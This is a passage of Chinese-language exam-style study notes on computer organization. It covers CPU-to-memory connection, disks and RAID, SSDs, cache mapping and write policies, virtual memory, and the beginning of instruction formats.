<p>存储芯片的容量不同，其地址线数也不同，而 CPU 的地址线数往往比存储芯片的地址线数要多。通常将 CPU 地址线的低位与存储芯片的地址线相连，以选择芯片中的某一单元（字选），这部分的译码是由芯片的片内逻辑完成的。而 CPU 地址线的高位则在扩充存储芯片时使用，用来选择存储芯片（片选），这部分译码由外接译码器逻辑完成。</p>
<p>例如：设 CPU 地址线为 <code>16</code> 位，即 A<sub>15</sub>~A<sub>0</sub>，<code>1K × 4</code> 位的存储芯片仅有 <code>10</code> 根地址线，此时可将 CPU 的低位地址 A<sub>9</sub>~A<sub>0</sub> 与存储芯片的地址线 A<sub>9</sub>~A<sub>0</sub> 相连。</p>
</li>
<li>
<p><strong>数据线的连接</strong></p>
<p>CPU 的数据线数与存储芯片的数据线数不一定相等，在相等时可直接相连；在不等时必须对存储芯片扩位，使其数据位数与 CPU 的数据线数相等。</p>
</li>
<li>
<p><strong>读/写命令线的连接</strong></p>
<p>CPU 读/写命令线一般可直接与存储芯片的读/写控制端相连，通常高电平为读，低电平为写。有些 CPU 的读/写命令线是分开的（读为 <code>RD</code>，写为 <code>WE</code>，均为低电平有效），此时 CPU 的读命令线应与存储芯片的允许读控制端相连，而 CPU 的写命令线则应与存储芯片的允许写控制端相连。</p>
</li>
<li>
<p><strong>片选线的连接</strong></p>
<p>片选线的连接是 CPU 与存储芯片连接的关键。存储器由许多存储芯片叠加而成，哪一片被选中完全取决于该存储芯片的片选控制端 <code>CS</code> 是否能接收到来自 CPU 的片选有效信号。</p>
<p>片选有效信号与 CPU 的访存控制信号 <code>MREQ</code>（低电平有效）有关，因为只有当 CPU 要求访存时，才要求选中存储芯片。若 CPU 访问 <code>I/O</code>，则 <code>MREQ</code> 为高，表示不要求存储器工作。</p>
</li>
</ol>
<h3> 外部存储器</h3>
<h4> 磁盘存储器</h4>
<p><strong>磁盘存储器的优点：</strong></p>
<ul>
<li>存储容量大，位价格低</li>
<li>记录介质可重复使用</li>
<li>记录信息可长期保存而不丢失，甚至可脱机存档</li>
<li>非破坏性读出，读出时不需要再生</li>
</ul>
<p><strong>磁盘存储器的缺点：</strong></p>
<ul>
<li>存取速度慢</li>
<li>机械结构复杂</li>
<li>对工作环境要求较高</li>
</ul>
<ol>
<li>
<p><strong>磁盘存储器</strong></p>
<ul>
<li>
<p><strong>磁盘设备的组成</strong></p>
<p>硬盘存储器的组成。硬盘存储器由磁盘驱动器、磁盘控制器和盘片组成。</p>
<ul>
<li><strong>磁盘驱动器</strong>：核心部件是磁头组件和盘片组件，温彻斯特盘是一种可移动磁头固定盘片的硬盘存储器</li>
<li><strong>磁盘控制器</strong>：硬盘存储器和主机的接口，主流的标准有 IDE、SCSI、SATA 等</li>
</ul>
<p>存储区域。一块硬盘含有若干记录面，每个记录面划分为若干磁道，而每条磁道又划分为若干扇区，扇区（也称块）是磁盘读写的最小单位，即磁盘按块存取。</p>
<ul>
<li><strong>磁头数（Heads）</strong>：即记录面数，表示硬盘共有多少个磁头，磁头用于读取/写入盘片上，记录面的信息，一个记录面对应一个磁头</li>
<li><strong>柱面数（Cylinders）</strong>：表示硬盘每面盘片上有多少条磁道。在一个盘组中，不同记录面的相同编号（位置）的诸磁道构成一个圆柱面</li>
<li><strong>扇区数（Sectors）</strong>：表示每条磁道上有多少个扇区</li>
</ul>
</li>
<li>
<p><strong>磁记录原理</strong></p>
<ul>
<li><strong>原理</strong>：磁头和磁性记录介质相对运动时，通过电磁转换完成读/写操作</li>
<li><strong>编码方法</strong>：按某种方案（规律），把一连串的二进制信息变换成存储介质磁层中一个磁化翻转状态的序列，并使读/写控制电路容易、可靠地实现转换</li>
<li><strong>磁记录方式</strong>：通常采用调频制（FM）和改进型调频制（MFM）的记录方式</li>
</ul>
</li>
<li>
<p><strong>磁盘的性能指标</strong></p>
<ul>
<li>
<p><strong>记录密度</strong>：是指盘片单位面积上记录的二进制信息量，通常以道密度、位密度和面密度表示。道密度是沿磁盘半径方向单位长度上的磁道数；位密度是磁道单位长度上能记录的二进制代码位数；面密度是位密度和道密度的乘积</p>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>磁盘所有磁道记录的信息量一定是相等的，并不是圆越大信息越多，故每个磁道的位密度都不同</p>
</div>
</li>
<li>
<p><strong>磁盘的容量</strong>：有非格式化容量和格式化容量之分。非格式化容量是指磁记录表面可利用的磁化单元总数，它由道密度和位密度计算而来；格式化容量是指按照某种特定的记录格式所能存储信息的总量。格式化后的容量比非格式化容量要小</p>
</li>
<li>
<p><strong>平均存取时间</strong>：平均存取时间由寻道时间（磁头移动到目的磁道的时间）、旋转延迟时间（磁头定位到要读写扇区的时间）和传输时间（传输数据所花费的时间）三部分构成。由于寻道和找扇区的距离远近不一，故寻道时间和旋转延迟时间通常取平均值</p>
</li>
<li>
<p><strong>数据传输率</strong>：磁盘存储器在单位时间内向主机传送数据的字节数，称为数据传输率。假设磁盘转数为 <code>r</code> 转/秒，每条磁道容量为 <code>N</code> 字节，则数据传输率为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>D</mi><mi>r</mi></msub><mo>=</mo><mi>r</mi><mi>N</mi></mrow><annotation encoding="application/x-tex">D_r = rN</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span></p>
</li>
</ul>
</li>
<li>
<p><strong>磁盘地址</strong></p>
<p>主机向磁盘控制器发送寻址信息，磁盘的地址一般如下图所示。</p>
<p>若系统中有 <code>4</code> 个驱动器，每个驱动器带一个磁盘，每个磁盘 <code>256</code> 个磁道、<code>16</code> 个盘面，每个盘面划分为 <code>16</code> 个扇区，则每个扇区地址要 <code>18</code> 位二进制代码，其格式如下图所示。</p>
<figure><figcaption>磁盘地址</figcaption></figure>
</li>
<li>
<p><strong>硬盘的工作过程</strong></p>
<p>硬盘的主要操作是寻址、读盘、写盘。每个操作都对应一个控制字，硬盘工作时，第一步是取控制字，第二步是执行控制字。</p>
<p>硬盘属于机械式部件，其读写操作是串行的，不可能在同一时刻既读又写，也不可能在同一时刻读两组数据或写两组数据。</p>
</li>
</ul>
</li>
<li>
<p><strong>磁盘阵列</strong></p>
<p>RAID（独立冗余磁盘阵列）是指 <strong>将多个独立的物理磁盘组成一个独立的逻辑盘</strong>，数据在多个物理盘上分割交叉存储、并行访问，具有更好的存储性能、可靠性和安全性。</p>
<p>RAID 的分级如下所示。在 RAID1~RAID5 几种方案中，无论何时有磁盘损坏，都可随时拔出受损的磁盘再插入好的磁盘，而数据不会损坏，提升了系统的可靠性。</p>
<ul>
<li><strong>RAID0</strong>：无冗余和无校验的磁盘阵列</li>
<li><strong>RAID1</strong>：镜像磁盘阵列</li>
<li><strong>RAID2</strong>：采用纠错的海明码的磁盘阵列</li>
<li><strong>RAID3</strong>：位交叉奇偶校验的磁盘阵列</li>
<li><strong>RAID4</strong>：块交叉奇偶校验的磁盘阵列</li>
<li><strong>RAID5</strong>：无独立校验的奇偶校验磁盘阵列</li>
</ul>
<p>RAID0 把连续多个数据块交替地存放在不同物理磁盘的扇区中，几个磁盘交叉并行读写，不仅扩大了存储容量，而且提高了磁盘数据存取速度，但 RAID0 没有容错能力。</p>
<p>为了提高可靠性，RAID1 使两个磁盘同时进行读写，互为备份，若一个磁盘出现故障，可从另一磁盘中读出数据。两个磁盘当一个磁盘使用，意味着容量减少一半。</p>
<p>总之，RAID 通过同时使用多个磁盘，提高了传输率；通过在多个磁盘上并行存取来大幅提高存储系统的数据吞吐量；通过镜像功能，提高安全可靠性；通过数据校验，提供容错能力。</p>
</li>
</ol>
<h4> 固态硬盘</h4>
<p>固态硬盘（SSD）是一种基于闪存技术的存储器。它与 U 盘并没有本质上的差别，只是容量更大，存取性能更好。一个 SSD 由一个或多个闪存芯片和闪存翻译层组成，闪存芯片替代传统旋转磁盘中的机械驱动器，而闪存翻译层将来自 CPU 的逻辑块读写请求翻译成对底层物理设备的读写控制信号，因此，这个闪存翻译层相当于扮演了磁盘控制器的角色。</p>
<p>一个闪存由 <code>B</code> 块组成，每块由 <code>P</code> 页组成。通常，页的大小是 <code>512B~4KB</code>，每块由 <code>32~128</code> 页组成，块的大小为 <code>16KB~512KB</code>。数据是以页为单位读写的。只有在一页所属的块整个被擦除后，才能写这一页。不过，一旦一个块被擦除，块中的每个页都可以直接再写一次。某个块进行了约 10 万次重复写之后，就会磨损坏，不能再使用。</p>
<p>随机写很慢，有两个原因。首先，擦除块比较慢，1ms 级，比访问页高一个数量级。其次，如果写操作试图修改一个包含已有数据的页 P<sub>i</sub>，那么这个块中所有含有用数据的页都必须被复制到一个新（擦除过的）块中，才能进行对页 P<sub>i</sub> 的写。</p>
<p>比起传统磁盘，SSD 有很多优点，它由半导体存储器构成，没有移动的部件，因而随机访问时间比机械磁盘要快很多，也没有任何机械噪声和震动，能耗更低，抗震性好，安全性高等。不过，SSD 也有缺点，因为反复写之后，闪存块会磨损，所以 SSD 也容易磨损。闪存翻译层中有一个平均磨损逻辑试图通过将擦除平均分布在所有的块上来最大化每个块的寿命。</p>
<h3> 高速缓冲存储器</h3>
<p>由于程序的转移概率不会很低，数据分布的离散性较大，所以单纯依靠并行主存系统提高主存系统的频宽是有限的。这就必须从系统结构上进行改进，即采用存储体系。通常将存储系统分为 <strong>Cache——主存</strong> 层次和 <strong>主存——辅存</strong> 层次。</p>
<h4> 程序访问的局部原理</h4>
<p>程序访问的局部性原理包括 <strong>时间局部性</strong> 和 <strong>空间局部性</strong>。时间局部性是指在最近的未来要用到的信息，很可能是现在正在使用的信息，因为程序中存在循环。空间局部性是指在最近的未来要用到的信息，很可能与现在正在使用的信息在存储空间上是邻近的，因为指令通常是顺序存放、顺序执行的，数据一般也是以向量、数组等形式簇聚地存储在一起的。</p>
<p>高速缓冲技术就是利用局部性原理，把程序中正在使用的部分数据存放在一个高速的、容量较小的 Cache 中，使 CPU 的访存操作大多数针对 Cache 进行，从而提高程序的执行速度。</p>
<h4> Cache 的基本工作原理</h4>
<p>Cache 位于存储器层次结构的顶层，通常由 <code>SRAM</code> 构成。</p>
<p>为便于 Cache 和主存间交换信息，Cache 和主存都被划分为相等的块，Cache 块又称 Cache 行，每块由若干字节组成，块的长度称为块长（Cache 行长）。由于 Cache 的容量远小于主存的容量，所以 Cache 中的块数要远少于主存中的块数，它仅保存主存中最活跃的若干块的副本。因此 Cache 按照某种策略，预测 CPU 在未来一段时间内欲访存的数据，将其装入 Cache。</p>
<p>当 CPU 发出 <strong>读请求</strong> 时，若访存地址在 Cache 中命中，就将此地址转换成 Cache 地址，直接对 Cache 进行读操作，与主存无关；若 Cache 不命中，则仍需访问主存，并把此字所在的块一次性地从主存调入 Cache。若此时 Cache 已满，则需根据某种替换算法，用这个块替换 Cache 中原来的某块信息。整个过程全部由硬件实现。值得注意的是，CPU 与 Cache 之间的数据交换以字为单位，而 Cache 与主存之间的数据交换则以 Cache 块为单位。</p>
<p>当 CPU 发出 <strong>写请求</strong> 时，若 Cache 命中，有可能会遇到 Cache 与主存中的内容不一致的问题。例如：由于 CPU 写 Cache，把 Cache 某单元中的内容从 X 修改成了 X1，而主存对应单元中的内容仍然是 X，没有改变。所以若 Cache 命中，需要按照一定的写策略处理，常见的处理方法有 <strong>全写法</strong> 和 <strong>回写法。</strong></p>
<p>CPU 欲访问的信息已在 Cache 中的比率称为 Cache 的命中率。</p>
<h4> Cache 和主存的映射方式</h4>
<p>Cache 行中的信息是主存中某个块的副本，地址映射是指把主存地址空间映射到 Cache 地址空间，即把存放在主存中的信息按照某种规则装入 Cache。</p>
<p>由于 Cache 行数比主存块数少得多，因此主存中只有一部分块的信息可放在 Cache 中，因此在 Cache 中要为每块加一个标记，指明它是主存中哪一块的副本。该标记的内容相当于主存中块的编号。为了说明 Cache 行中的信息是否有效，每个 Cache 行需要一个有效位。</p>
<p>地址映射的方法有以下三种。</p>
<ol>
<li>
<p><strong>直接映射</strong></p>
<p>主存中的每一块只能装入 Cache 中的唯一位置。若这个位置已有内容，则产生块冲突，原来的块将无条件地被替换出去（无须使用替换算法）。直接映射实现简单，但不够灵活，即使 Cache 的其他许多地址空着也不能占用，这使得直接映射的块冲突概率最高，空间利用率最低。</p>
<p>直接映射的关系可定义为：<em>Cache 行号 = 主存块号 mod Cache 总行数</em></p>
<p>直接相联映射的地址结构为：<em>标记 - Cache 行号 - 块内地址</em></p>
</li>
<li>
<p><strong>全相联映射</strong></p>
<p>主存中的每一块可以装入 Cache 中的任何位置，每行的标记用于指出该行取自主存的哪一块，所以 CPU 访存时需要与所有 Cache 行的标记进行比较。<strong>全相联映射方式的优点</strong>：比较灵活，Cache 块的冲突概率低，空间利用率高，命中率也高；<strong>缺点</strong>：标记的比较速度较慢，实现成本较高，通常需要采用昂贵的按内容寻址的相联存储器进行地址映射。</p>
<p>全相联映射的地址结构为：<em>标记 - 块内地址</em></p>
</li>
<li>
<p><strong>组相联映射</strong></p>
<p>将 Cache 分成 <code>Q</code> 个大小相等的组，每个主存块可以装入固定组中的任意一行，即组间采用直接映射、而组内采用全相联映射的方式。它是对直接映射和全相联映射的一种折中，当 <code>Q = 1</code> 时变为全相联映射，当 <code>Q = Cache</code> 行数时变为直接映射。假设每组有 <code>r</code> 个 Cache 行，则称之为 <code>r</code> 路组相联。例如：每组有 <code>2</code> 个 Cache 行，因此称为二路组相联。</p>
<p>组相联映射的关系可以定义为：<em>Cache 组号 = 主存块号 mod Cache 组数（Q）</em></p>
<p>路数越大，即每组 Cache 行的数量越大，发生块冲突的概率越低，但相联比较电路也越复杂。选定适当的数量，可使组相联映射的成本接近直接映射，而性能上仍接近全相联映射。</p>
<p>组相联映射的地址结构为：<em>标记 - 组号 - 块内地址</em></p>
</li>
</ol>
<p>三种映射方式中，直接映射的每个主存块只能映射到 Cache 中的某一固定行；全相联映射可以映射到所有 Cache 行；N 路组相联映射可以映射到 N 行。当 Cache 大小、主存块大小一定时：</p>
<ul>
<li>直接映射的命中率最低，全相联映射的命中率最高</li>
<li>直接映射的判断开销最小、所需时间最短，全相联映射的判断开销最大、所需时间最长</li>
<li>直接映射标记所占的额外空间开销最少，全相联映射标记所占的额外空间开销最大</li>
</ul>
<h4> Cache 中主存块的替换算法</h4>
<p>在采用全相联映射或组相联映射方式时，从主存向 Cache 传送一个新块，当 Cache 或 Cache 组中的空间已被占满时，就需要使用替换算法置换 Cache 行。而采用直接映射时，一个给定的主存块只能放到唯一的固定 Cache 行中，所以在对应 Cache 行已有一个主存块的情况下，新的主存块毫无选择地把原先已有的那个主存块替换掉，因而无须考虑替换算法。</p>
<p><strong>常用的替换算法</strong> 有随机（RAND）算法、先进先出（FIFO）算法、近期最少使用（LRU）算法和最不经常使用（LFU）算法。</p>
<ul>
<li>
<p><strong>随机算法（RAND）</strong>：随机地确定替换的 Cache 块。它的实现比较简单，但未依据程序访问的局部性原理，因此可能命中率较低</p>
</li>
<li>
<p><strong>先进先出算法（FIFO）</strong>：选择最早调入的行进行替换。它比较容易实现，但也未依据程序访问的局部性原理，因为最早进入的主存块也可能是目前经常要用的</p>
</li>
<li>
<p><strong>近期最少使用算法（LRU）</strong>：依据程序访问的局部性原理，选择近期内长久未访问过的 Cache 行作为替换的行，平均命中率要比 FIFO 的高，是堆栈类算法</p>
<p>LRU 算法对每个 Cache 行设置一个计数器，用计数值来记录主存块的使用情况，并根据计数值选择淘汰某个块，计数值的位数与 Cache 组大小有关，2 路时有一位 LRU 位，4 路时有两位 LRU 位。</p>
<p><strong>计数器的变化规则：</strong></p>
<ul>
<li>命中时，所命中的行的计数器清零，比其低的计数器加 <code>1</code>，其余不变</li>
<li>未命中且还有空闲行时，新装入的行的计数器置 <code>0</code>，其余全加 <code>1</code></li>
</ul>
<p>当集中访问的存储区超过 Cache 组的大小时，命中率可能变得很低，这种现象称为 <strong>抖动。</strong></p>
</li>
<li>
<p><strong>最不经常使用算法</strong>：将一段时间内被访问次数最少的存储行换出。每行也设置一个计数器，新行建立后从 <code>0</code> 开始计数，每访问一次，被访问的行计数器加 <code>1</code>，需要替换时比较各特定行的计数值，将计数值最小的行换出。这种算法与 LRU 类似，但不完全相同</p>
</li>
</ul>
<h4> Cache 写策略</h4>
<p>因为 Cache 中的内容是主存块副本，当对 Cache 中的内容进行更新时，就需选用写操作策略使 Cache 内容和主存内容保持一致。此时分两种情况。</p>
<p><strong>对于 Cache 写命中（write hit），有两种处理方法：</strong></p>
<ol>
<li>
<p><strong>全写法（写直通法、write-through）</strong></p>
<p>当 CPU 对 Cache 写命中时，必须把数据同时写入 Cache 和主存。当某一块需要替换时，不必把这一块写回主存，用新调入的块直接覆盖即可。这种方法实现简单，能随时保持主存数据的正确性。缺点是增加了访存次数，降低了 Cache 的效率。写缓冲：为减少全写法直接写入主存的时间损耗，在 Cache 和主存之间加一个写缓冲（Write Buffer）。CPU 同时写数据到 Cache 和写缓冲中，写缓冲再控制将内容写入主存。写缓冲是一个 FIFO 队列，写缓冲可以解决速度不匹配的问题。但若出现频繁写时，会使写缓冲饱和溢出。</p>
</li>
<li>
<p><strong>回写法（write-back）</strong></p>
<p>当 CPU 对 Cache 写命中时，只把数据写入 Cache，而不立即写入主存，只有当此块被换出时才写回主存。这种方法减少了访存次数，但存在不一致的隐患。为了减少写回主存的开销，每个 Cache 行设置一个修改位（脏位）。若修改位为 <code>1</code>，则说明对应 Cache 行中的块被修改过，替换时需要写回主存；若修改位为 <code>0</code>，则说明对应 Cache 行中的块未被修改过，替换时无须写回主存。</p>
</li>
</ol>
<p>全写法和回写法都对应于 Cache 写命中（要被修改的单元在 Cache 中）时的情况。</p>
<p><strong>对于 Cache 写不命中，也有两种处理方法：</strong></p>
<ol>
<li>
<p><strong>写分配法（write-allocate）</strong></p>
<p>加载主存中的块到 Cache 中，然后更新这个 Cache 块。它试图利用程序的空间局部性，但缺点是每次不命中都需要从主存中读取一块。</p>
</li>
<li>
<p><strong>非写分配法（not-write-allocate）</strong></p>
<p>只写入主存，不进行调块。</p>
</li>
</ol>
<p><strong>非写分配法通常与全写法合用，写分配法通常和回写法合用</strong>。随着新技术的发展（如：指令预取），需要将指令 Cache 和数据 Cache 分开设计，这就有了分离的 Cache 结构。统一 Cache 的优点是设计和实现相对简单，但由于执行部件存取数据时，指令预取部件要从同一 Cache 读指令，会引发冲突。采用分离 Cache 结构可以解决这个问题，而且分离的指令和数据 Cache 还可以充分利用指令和数据的不同局部性来优化性能。</p>
<h3> 虚拟存储器</h3>
<p>主存和辅存共同构成了虚拟存储器，二者在硬件和系统软件的共同管理下工作。对于应用程序员而言，虚拟存储器是透明的。虚拟存储器具有主存的速度和辅存的容量。</p>
<h4> 虚拟存储器的基本概念</h4>
<p>虚拟存储器将主存或辅存的地址空间统一编址，形成一个庞大的地址空间，在这个空间内，用户可以自由编程，而不必在乎实际的主存容量和程序在主存中实际的存放位置。</p>
<p>用户编程允许涉及的地址称为 <strong>虚地址或逻辑地址</strong>，虚地址对应的存储空间称为虚拟空间或程序空间。实际的主存单元地址称为 <strong>实地址或物理地址</strong>，实地址对应的是主存地址空间，也称实地址空间。虚地址比实地址要大很多。</p>
<p>CPU 使用虚地址时，由辅助硬件找出虚地址和实地址之间的对应关系，并判断这个虚地址对应的存储单元内容是否已装入主存。若已在主存中，则通过地址变换，CPU 可直接访问主存指示的实际单元；若不在主存中，则把包含这个字的一页或一段调入主存后再由 CPU 访问。若主存已满，则采用替换算法置换主存中的交换块（即页面）。</p>
<p>虚拟存储器也采用和 Cache 类似的技术，将辅存中经常访问的数据副本存放到主存中。但是缺页（或段）而访问辅存的代价很大，提高命中率是关键，因此虚拟存储机制采用全相联映射，每个虚页面可以存放到对应主存区域的任何一个空闲页位置。此外，当进行写操作时，不能每次写操作都同时写回磁盘，因而，在处理一致性问题时，采用回写法。</p>
<h4> 页式虚拟存储器</h4>
<p>页式虚拟存储器以 <strong>页</strong> 为基本单位。虚拟空间与主存空间都被划分成同样大小的页，主存的页称为实页、页框，虚存的页称为虚页。把虚拟地址分为两个字段：<strong>虚页号</strong> 和 <strong>页内地址</strong>。<strong>虚拟地址到物理地址的转换是由页表实现的</strong>。页表是一张存放在主存中的虚页号和实页号的对照表，它记录程序的虚页调入主存时被安排在主存中的位置。页表一般长久地保存在内存中。</p>
<ol>
<li>
<p><strong>页表</strong></p>
<p>CPU 执行指令时，需要先将虚拟地址转换为主存物理地址。页表基址寄存器存放进程的页表首地址，然后根据虚拟地址高位部分的虚拟页号找到对应的页表项，若装入位为 <code>1</code>，则取出物理页号，和虚拟地址低位部分的页内地址拼接，形成实际物理地址；若装入位为 <code>0</code>，则说明缺页，需要操作系统进行缺页处理。</p>
<p>页式虚拟存储器的优点是：页面的长度固定，页表简单，调入方便。缺点是：由于程序不可能正好是页面的整数倍，最后一页的零头将无法利用而造成浪费，并且页不是逻辑上独立的实体，所以处理、保护和共享都不及段式虚拟存储器方便。</p>
</li>
<li>
<p><strong>快表（TLB）</strong></p>
<p>由地址转换过程可知，访存时先访问一次主存去查页表，再访问主存才能取得数据。如果缺页，那么还要进行页面替换、页面修改等，因此采用虚拟存储机制后，访问主存的次数更多了。</p>
<p>依据程序执行的局部性原理，在一段时间内总是经常访问某些页时，若把这些页对应的页表项存放在高速缓冲器组成的快表（TLB）中，则可以明显提高效率。相应地把放在主存中的页表称为慢表（Page）。在地址转换时，首先查找快表，若命中，则无须访问主存中的页表。</p>
</li>
<li>
<p><strong>具有 TLB 和 Cache 的多级存储系统</strong></p>
<p>一个具有 TLB 和 Cache 的多级存储系统，其中 Cache 采用二路组相联方式。CPU 给出一个 32 位的虚拟地址，TLB 采用全相联方式，每一项都有一个比较器，查找时将虚页号与每个 TLB 标记字段同时进行比较，若有某一项相等且对应有效位为 <code>1</code>，则 TLB 命中，此时可直接通过 TLB 进行地址转换；若未命中，则 TLB 缺失，需要访问主存去查页表。如果用两级页表方式，虚页号被分成页目录索引和页表索引两部分，由这两部分得到对应的页表项，从而进行地址转换，并将相应表项调入 TLB，若 TLB 已满，则还需要采用替换策略。完成由虚拟地址到物理地址的转换后，Cache 机构根据映射方式将物理地址划分成多个字段，然后根据映射规则找到对应的 Cache 行或组，将对应 Cache 行中的标记与物理地址中的高位部分进行比较，若相等且对应有效位为 <code>1</code>，则 Cache 命中，此时根据块内地址取出对应的字送 CPU。</p>
</li>
</ol>
<h4> 段式虚拟存储器</h4>
<p>段式虚拟存储器中的 <strong>段是按程序的逻辑结构划分的</strong>，各个段的长度因程序而异。把虚拟地址分为两部分：<strong>段号</strong> 和 <strong>段内地址</strong>。虚拟地址到实地址之间的变换是由段表来实现的。段表是程序的逻辑段和在主存中存放位置的对照表。段表的每行记录与某个段对应的段号、装入位、段起点和段长等信息。由于段的长度可变，所以段表中要给出各段的起始地址与段的长度。</p>
<p>CPU 根据虚拟地址访存时，首先根据段号与段表基地址拼接成对应的段表行，然后根据该段表行的装入位判断该段是否已调入主存（装入位为 “1”，表示该段已调入主存；装入位为 “0”，表示该段不在主存中）。已调入主存时，从段表读出该段在主存中的起始地址，与段内地址（偏移量）相加，得到对应的主存实地址。</p>
<p><strong>段式虚拟存储器的优点</strong>：段的分界与程序的自然分界相对应，因而具有逻辑独立性，使得它易于编译、管理、修改和保护，也便于多道程序的共享；<strong>缺点</strong>：因为段长度可变，分配空间不便，容易在段间留下碎片，不好利用，造成浪费。</p>
<h4> 段页虚拟存储器</h4>
<p>把程序按逻辑结构分段，每段再划分为固定大小的页，主存空间也划分为大小相等的页，程序对主存的调入、调出仍以页为基本传送单位，这样的虚拟存储器称为段页式虚拟存储器。在段页式虚拟存储器中，每个程序对应一个段表，每段对应一个页表，段的长度必须是页长的整数倍，段的起点必须是某一页的起点。</p>
<p>虚地址分为段号、段内页号、页内地址三部分。CPU 根据虚地址访存时，首先根据段号得到段表地址；然后从段表中取出该段的页表起始地址，与虚地址段内页号合成，得到页表地址；最后从页表中取出实页号，与页内地址拼接形成主存实地址。</p>
<p><strong>段页式虚拟存储器的优点</strong>：兼具页式和段式虚拟存储器的优点，可以按段实现共享和保护。<strong>缺点</strong>：在地址变换过程中需要两次查表，系统开销较大。</p>
<h4> 虚拟存储器与 Cache 的比较</h4>
<ol>
<li>
<p><strong>相同之处</strong></p>
<ul>
<li>最终目标都是为了提高系统性能，两者都有容量、速度、价格的梯度</li>
<li>都把数据划分为小信息块，并作为基本的传递单位，虚存系统的信息块更大</li>
<li>都有地址的映射、替换算法、更新策略等问题</li>
<li>依据程序的局部性原理应用 “快速缓存的思想”，将活跃的数据放在相对高速的部件中</li>
</ul>
</li>
<li>
<p><strong>不同之处</strong></p>
<ul>
<li>Cache 主要解决系统速度，而虚拟存储器却是为了解决主存容量</li>
<li>Cache 全由硬件实现，是硬件存储器，对所有程序员透明；而虚拟存储器由 OS 和硬件共同实现，是逻辑上的存储器，对系统程序员不透明，但对应用程序员透明</li>
<li>对于不命中性能影响，因为 CPU 的速度约为 Cache 的 10 倍，主存的速度为硬盘的 100 倍以上，因此虚拟存储器系统不命中时对系统性能影响更大</li>
<li>CPU 与 Cache 和主存都建立了直接访问的通路，而辅存与 CPU 没有直接通路。也就是说在 Cache 不命中时主存能和 CPU 直接通信，同时将数据调入 Cache；而虚拟存储器系统不命中时，只能先由硬盘调入主存，而不能直接和 CPU 通信</li>
</ul>
</li>
</ol>
<h2> 指令系统</h2>
<h3> 指令系统</h3>
<p>指令（机器指令）是指 <strong>计算机执行某种操作的命令</strong>。一台计算机的所有指令的集合构成该机的 <strong>指令系统</strong>，也称指令集。指令系统是指令集体系结构（ISA）中最核心的部分，ISA 完整定义了软件和硬件之间的接口，是机器语言或汇编语言程序员所应熟悉的。ISA 规定的内容主要包括：指令格式，数据类型及格式，操作数的存放方式，程序可访问的寄存器个数、位数和编号，存储空间的大小和编址方式，寻址方式，指令执行过程的控制方式等。</p>
<h4> 指令的基本格式</h4>
<p><strong>一条指令就是机器语言的一个语句，它是一组有意义的二进制代码</strong>。一条指令通常包括 <strong>操作码字段</strong> 和 <strong>地址码字段</strong> 两部分。其中，操作码指出指令中该指令应该执行什么性质的操作以及具有何种功能。操作码是识别指令、了解指令功能及区分操作数地址内容的组成和使用方法等的关键信息。例如：指出是算术加运算还是算术减运算，是程序转移还是返回操作。</p>
<p>地址码给出被操作的信息（指令或数据）的地址，包括参加运算的一个或多个操作数所在的地址、运算结果的保存地址、程序的转移地址、被调用的子程序的入口地址等。</p>
<p>指令的长度是指 <strong>一条指令中所包含的二进制代码的位数</strong>。指令字长取决于操作码的长度、操作数地址码的长度和操作数地址的个数。指令长度与机器字长没有固定的关系，它可以等于机器字长，也可以大于或小于机器字长。通常，把指令长度等于机器字长的指令称为 <strong>单字长指令</strong>，指令长度等于半个机器字长的指令称为 <strong>半字长指令</strong>，指令长度等于两个机器字长的指令称为 <strong>双字长指令。</strong></p>
<p>在一个指令系统中，若所有指令的长度都是相等的，则称为 <strong>定长指令字结构</strong>。定字长指令的执行速度快，控制简单。若各种指令的长度随指令功能而异，则称为 <strong>变长指令字结构</strong>。然而，因为主存一般是按字节编址的，所以指令字长多为字节的整数倍。</p>
<p>根据指令中操作数地址码的数目的不同，可将指令分成以下几种格式：</p>
<ol>
<li>
<p><strong>零地址指令</strong></p>
<p>只给出 <strong>操作码 OP</strong>，没有显式地址。这种指令有两种可能：</p>
<ul>
<li>不需要操作数的指令，如：空操作指令、停机指令、关中断指令等</li>
<li>零地址的运算类指令仅用在堆栈计算机中。通常参与运算的两个操作数隐含地从栈顶和次栈顶弹出，送到运算器进行运算，运算结果再隐含地压入堆栈</li>
</ul>
</li>
<li>
<p><strong>一地址指令</strong></p>
<p>给出 <strong>操作码 OP</strong>，一个地址码 A<sub>1</sub>。这种指令也有两种常见的形态，要根据操作码的含义确定究竟是哪一种。</p>
<ul>
<li>
<p>只有目的操作数的单操作数指令，按 A<sub>1</sub> 地址读取操作数，进行 OP 操作后，结果存回原地址</p>
<ul>
<li>指令含义：OP(A<sub>1</sub>)→A<sub>1</sub></li>
<li>如操作码含义是加 1、减 1、求反、求补等</li>
</ul>
</li>
<li>
<p>隐含约定目的地址的双操作数指令，按指令地址 A<sub>1</sub> 可读取源操作数，指令可隐含约定另一个操作数由 ACC（累加器）提供，运算结果也将存放在 ACC 中</p>
<ul>
<li>指令含义：(ACC)OP(A<sub>1</sub>)→ACC</li>
<li>若指令字长为 <code>32</code> 位，操作码占 <code>8</code> 位，<code>1</code> 个地址码字段占 <code>24</code> 位，则指令操作数的直接寻址范围为 2<sup>24</sup> = 16M</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>二地址指令</strong></p>
<p>给出 <strong>操作码 OP</strong>，两个地址码 A<sub>1</sub> 和 A<sub>2</sub>。</p>
<ul>
<li>指令含义：(A<sub>1</sub>)OP(A<sub>2</sub>)→A<sub>1</sub></li>
